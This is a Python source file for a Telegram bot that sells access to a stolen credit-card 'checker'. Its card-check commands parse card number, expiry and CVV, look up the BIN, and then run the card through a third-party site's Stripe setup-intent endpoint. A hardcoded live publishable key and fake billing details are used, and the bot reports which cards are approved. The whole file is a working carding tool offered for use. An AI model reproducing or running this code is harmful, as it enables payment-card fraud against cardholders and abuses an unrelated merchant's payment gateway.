
from aiogram.types import Message
from main import dp
from main import PREFIX , ok
import re
from handlers.user.newf import checkLuhn
import requests
PREFIX = "!/."
ANTISPAM = int(60)
import concurrent.futures
from aiogram import *
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.exceptions import Throttled

import time


@dp.message_handler(
  commands=['plan', 'plans', 'buy'], commands_prefix=PREFIX
)  #------------------------------------------------------buy-------------------------------------
async def infobbkc(message: types.Message):

  m = message.from_user.id
  kc = ok(m)
  button2 = InlineKeyboardButton(text="hide", callback_data="hide")

  keyboard_inline = InlineKeyboardMarkup().add(button2)
  if "OWNER" in kc:

    return await message.reply(''' 
how can a developer buy his own bot :)
        ''',
                               reply_markup=keyboard_inline)
  elif "PAID" in kc:
    return await message.reply(f''' 
<a href="tg://user?id={m}">{message.from_user.first_name}</a> no need to buy you are alredy a premium member
''',
                               reply_markup=keyboard_inline)
  else:

    button1 = InlineKeyboardButton(text="plans", callback_data="buy")
    button2 = InlineKeyboardButton(text="hide", callback_data="hide")

    keyboard_inline = InlineKeyboardMarkup().add(button1).add(button2)
    return await message.reply(
      """<b> click the below button to see my plans </b> """,
      reply_markup=keyboard_inline,
      disable_web_page_preview=True)











@dp.message_handler(commands=['pp','chk','sl' , 'ss'], commands_prefix=PREFIX)
async def chk(message: types.Message):
  toc = time.perf_counter()
  kk = await message.reply('<b>wait i am checking y our card </b>')
  await kk.edit_text(f"<b>□□□□□</b>")
  ug = message.chat.type
  m = message.from_user.id
  kc = ok(m)
  if "private" in ug:
    if "OWNER" in kc or "PAID" in kc:
      pass

    else:
      button3 = InlineKeyboardButton(text="Join",
                                     url="https://t.me/Jorgebarba")
      keyboard_inline = InlineKeyboardMarkup().add(button3)
      return await kk.edit_text(
        "<b> ❌ chats not allowed ❌\nTo use me for free  Join  https://t.me/Jorgebarba </b>",
        reply_markup=keyboard_inline,
        disable_web_page_preview=True)
    pass
  elif "supergroup" in ug or "group" in ug:
    guid = f'{message.chat.id}'

    paid = open("group.txt").read().splitlines()
    if guid in paid:

      try:
        if "OWNER" in kc or "PAID" in kc:
          pass
        else:
          await dp.throttle('chk', rate=ANTISPAM)
      except Throttled:
        keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
        btns = types.InlineKeyboardButton("Take Preamium ",
                                          url="https://t.me/cyberassemble")
        button2 = InlineKeyboardButton(text="close", callback_data="close")
        keyboard_markup.row(btns, button2)
        return await kk.edit_text(
          """<b> Sorry Request Bloced Due To Antispam  Try Again After Some Time</b>""",
          reply_markup=keyboard_markup,
          disable_web_page_preview=True)

    else:
      button3 = InlineKeyboardButton(text="Join",
                                     url="")
      keyboard_inline = InlineKeyboardMarkup().add(button3)
      return await kk.edit_text(
        f"<b> ❌ chats not allowed ❌\nTo use me for free  Join  https://t.me/Jorgebarba </b>",
        reply_markup=keyboard_inline,
        disable_web_page_preview=True)
  else:
    button3 = InlineKeyboardButton(text="Join",
                                   url="https://t.me/cyberassemble")
    keyboard_inline = InlineKeyboardMarkup().add(button3)
    return await kk.edit_text(
      f"<b> ❌ chats not allowed ❌\nTo use me for free  Join   </b>",
      reply_markup=keyboard_inline,
      disable_web_page_preview=True)
  await kk.edit_text(f"<b>■□□□□</b>")
  if message.reply_to_message:
    cc = message.reply_to_message.text

  else:
    cc = message.text

  if len(cc) == 0:
    return await kk.edit_text("<b>No Card to chk</b>")

  cards = []
  x = cc
  input = re.findall(r"[0-9]+", x)
  if not input or len(input) < 3:
    return await kk.edit_text("no cc found")
  if len(input) == 3:
    cc = input[0]
    if len(input[1]) == 3:
      mes = input[2][:2]
      ano = input[2][2:]
      cvv = input[1]
    else:
      mes = input[1][:2]
      ano = input[1][2:]
      cvv = input[2]
  else:
    cc = input[0]
    if len(input[1]) == 3:
      mes = input[2]
      ano = input[3]
      cvv = input[1]
    else:
      mes = input[1]
      ano = input[2]
      cvv = input[3]
    if len(mes) == 2 and (mes > '12' or mes < '01'):
      ano1 = mes
      mes = ano
      ano = ano1
  if cc and not checkLuhn(cc): pass
  await kk.edit_text(f"<b>■■□□□</b>")
  if (cc, mes, ano, cvv):
    cards.append([cc, mes, ano, cvv])

  BIN = cc[:6]
  

  rem = requests.get(f"https://lookup.binlist.net/{BIN}").json()
  try:
    bnk = rem["bank"]["name"]
    scheme = rem["scheme"]
    type = rem["type"]
    brand = rem["brand"]
    countery = rem["country"]["name"]
    emojis = rem["country"]["emoji"]
  except:
    bnk = ""
    scheme = ""
    type = ""
    brand = ""
    countery = ""
    emojis = ""


  

  url1 = "https://www.afscv.org/_public/Components/Commerce/Configuration/PaymentMethods/Methods/CreditCard/Gateways/Stripe/setup_intent.php"
  data1 = """{"payment_method_id":6}"""    
      
  r1 = requests.post(url1, data=data1)
  r1j = r1.json()
  try:
      seti = r1j["id"]
      seti_s = r1j["client_secret"]    
  except:
      cm = r1j["error"]["code"]
      tic = time.perf_counter()
      return await kk.edit_text(f"""
Card ⇾<code>{cc}|{mes}|{ano}|{cvv}</code>
Response ⇾<b> {cm} 🚫</b>
gate ⇾<b>stripe Auth </b>
<b>———»Details«———</b>
 Bin info   -»<b>{scheme}</b>-<b>{type}</b>-<b>{brand}</b>
Country name  -»<b>{countery} {emojis}</b>
bank info -»<b>{bnk}</b>
<b>———-»Info«-———-</b>
Proxy ⇾Live! ✅
 Time  ⇾<b>{toc - tic:0.4f}</b>'s
 check by ⇾<a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{ok(message.from_user.id)}]
Bot by ⇾<a href="tg://user?id=796121550"><b>RAS</b></a>""",
                            disable_web_page_preview=True)
      
  url2 = f"https://api.stripe.com/v1/setup_intents/{seti}/confirm"
  data2 = f"payment_method_data[type]=card&payment_method_data[billing_details][name]=+Sam+smith&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=d2f1afe2-277e-40da-8408-5ef25ae9b1a1e88e53&payment_method_data[muid]=f197fbad-91a1-4baf-b100-b4df1f809487c204b3&payment_method_data[sid]=7f5c025b-8e69-4ace-819e-e463863c40bbb0d00e&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fc8b8c6168%3B+stripe-js-v3%2Fc8b8c6168&payment_method_data[time_on_page]=501203&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51F0EDvB1Ma5SOvilMZe4TNFodNsWG1JYYPHSGiDvRYkKEHFRfxWZx540KUSbS23ypfSNvDJyq06kakMaPw5QGhMX00VdgIt50x&client_secret={seti_s}"
      
  r2 = requests.post(url2, data=data2)
  r2j = r2.json()
  
  r2t = r2.text

  if "succeeded" in r2t:
      tic = time.perf_counter()
      return await kk.edit_text(f"""
 Card ⇾<code>{cc}|{mes}|{ano}|{cvv}</code>
 Response ⇾<b> Approved ✅</b>
 gate ⇾<b>stripe Auth </b>
<b>———»Details«———</b>
 Bin info   -»<b>{scheme}</b>-<b>{type}</b>-<b>{brand}</b>
 Country name  -»<b>{countery} {emojis}</b>
 bank info -»<b>{bnk}</b>
<b>———-»Info«-———-</b>
 Proxy ⇾Live! ✅
 Time  ⇾<b>{toc - tic:0.4f}</b>'s
 check by ⇾<a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{ok(message.from_user.id)}]
 Bot by ⇾<a href="tg://user?id=796121550"><b>RAS</b></a>""",
                            disable_web_page_preview=True)
  elif "incorrect_number" in r2t:
      Inc = r2j["error"]["code"]
      tic = time.perf_counter()
      return await kk.edit_text(f"""
 Card ⇾<code>{cc}|{mes}|{ano}|{cvv}</code>
 Response ⇾<b> {Inc} 🚫</b>
 gate ⇾<b>stripe Auth </b>
<b>———»Details«———</b>
 Bin    -»<b>{scheme}</b>-<b>{type}</b>-<b>{brand}</b>
 Country name  -»<b>{countery} {emojis}</b>
 bank info -»<b>{bnk}</b>
<b>———-»Info«-———-</b>
 Proxy ⇾Live! ✅
 Time  ⇾<b>{toc - tic:0.4f}</b>'s
 check by ⇾<a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{ok(message.from_user.id)}]
 Bot by ⇾<a href="tg://user?id=796121550"><b>RAS</b></a>""",
                            disable_web_page_preview=True)
  elif "error" in r2t:
      try:
          err = r2j["error"]["decline_code"]
          tic = time.perf_counter()
          return await kk.edit_text(f"""
 Card ⇾ <code>{cc}|{mes}|{ano}|{cvv}</code>
 Response ⇾ <b> {err} 🚫</b>
 gate ⇾ <b>Stripe Auth </b>
<b>———⇾Details⇾———</b>
Bin info ⇾<b>{scheme}</b>-<b>{type}</b>-<b>{brand}</b>
 Country name   ⇾<b>{countery} {emojis}</b>
 bank info⇾<b>{bnk}</b>
<b>———⇾Info⇾———-</b>
 Proxy ⇾ Live! ✅
 Time  ⇾ <b>{toc - tic:0.4f}</b>'s
 check by ⇾ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{ok(message.from_user.id)}]
 Bot by ⇾ <a href="tg://user?id=796121550"><b>RAS</b></a>""",
                            disable_web_page_preview=True)
      except:
          kd = r2j["error"]["code"]
          tic = time.perf_counter()
      return await kk.edit_text(f"""
 Card ⇾ <code>{cc}|{mes}|{ano}|{cvv}</code>
 Response ⇾ <b> {kd} 🚫</b>
 gate ⇾ <b>stripe Auth </b>
<b>———⇾Details⇾———</b>
  Bin info   ⇾<b>{scheme}</b>-<b>{type}</b>-<b>{brand}</b>
 Country name  ⇾<b>{countery} {emojis}</b>
 bank ⇾<b>{bnk}</b>
<b>———⇾Info⇾———-</b>
 Proxy ⇾ Live! ✅
 Time  ⇾ <b>{toc - tic:0.4f}</b>'s
 check by ⇾ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{ok(message.from_user.id)}]
 Bot by ⇾ <a href="tg://user?id=796121550"><b>RAS</b></a>""",
                            disable_web_page_preview=True)
  else:
      tic = time.perf_counter()
      return await kk.edit_text(f"""
 Card ⇾<code>{cc}|{mes}|{ano}|{cvv}</code>
 Response ⇾ <b> Bin   not Found 🚫</b>
 gate ⇾<b>stripe Auth </b>
<b>———»Details«———</b>
 Bin info  ⇾
Country name  ⇾
bank info⇾
<b>———-»Info«-———-</b>
 Proxy ⇾Live! ✅
 Time  ⇾<b>{toc - tic:0.4f}</b>'s
 check by ⇾<a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{ok(message.from_user.id)}]
 Bot by ⇾<a href="tg://user?id=796121550"><b>RAS</b></a>""",
                            disable_web_page_preview=True)





























